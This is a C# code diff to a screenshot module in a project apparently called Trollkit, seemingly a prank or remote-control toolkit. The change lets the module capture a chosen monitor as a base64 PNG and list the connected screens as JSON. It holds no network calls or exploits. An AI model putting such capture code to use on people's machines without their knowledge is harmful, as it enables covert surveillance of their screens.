@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Newtonsoft.Json;
+using System;
 using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -7,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Trollkit_Library.Models;
 
 namespace Trollkit_Library.Modules
 {
@@ -23,19 +25,28 @@ namespace Trollkit_Library.Modules
 		/// Returns a base64 string of the screenshot
 		/// </summary>
 		/// <returns></returns>
-		public static string MakeScreenshot()
+		public static string MakeScreenshot(string monitorNumber)
 		{
-			Screen screen = Screen.PrimaryScreen;
-			DEVMODE dm = new DEVMODE();
-			dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
-			EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);
-			using (Bitmap bmp = new Bitmap(dm.dmPelsWidth, dm.dmPelsHeight))
-			using (Graphics g = Graphics.FromImage(bmp))
+			int number = 0;
+			bool parse = int.TryParse(monitorNumber, out number);
+			if (parse)
 			{
-				g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bmp.Size);
+				Screen screen = Screen.AllScreens[number];
+				DEVMODE dm = new DEVMODE();
+				dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
+				EnumDisplaySettings(screen.DeviceName, ENUM_CURRENT_SETTINGS, ref dm);
+				using (Bitmap bmp = new Bitmap(dm.dmPelsWidth, dm.dmPelsHeight))
+				using (Graphics g = Graphics.FromImage(bmp))
+				{
+					g.CopyFromScreen(dm.dmPositionX, dm.dmPositionY, 0, 0, bmp.Size);
 
-				byte[] imageArray = bmp.ToByteArray(ImageFormat.Png);
-				return Convert.ToBase64String(imageArray);
+					byte[] imageArray = bmp.ToByteArray(ImageFormat.Png);
+					return Convert.ToBase64String(imageArray);
+				}
+			}
+			else
+			{
+				return "";
 			}
 		}
 
@@ -46,6 +57,26 @@ namespace Trollkit_Library.Modules
 		public static int GetScreenCount()
 		{
 			return Screen.AllScreens.Length;
+		}
+
+		/// <summary>
+		/// Returns a json list of screens
+		/// </summary>
+		/// <returns></returns>
+		public static string GetScreenList()
+		{
+			List<ScreenTypeModel> screenList = new List<ScreenTypeModel>();
+			int screencount = 0;
+			foreach(Screen screen in Screen.AllScreens)
+			{
+				screenList.Add(new ScreenTypeModel
+				{
+					ScreenId = screencount++,
+					ScreenName = screen.DeviceName
+				});
+			}
+
+			return JsonConvert.SerializeObject(screenList);
 		}
 
 		/// <summary>
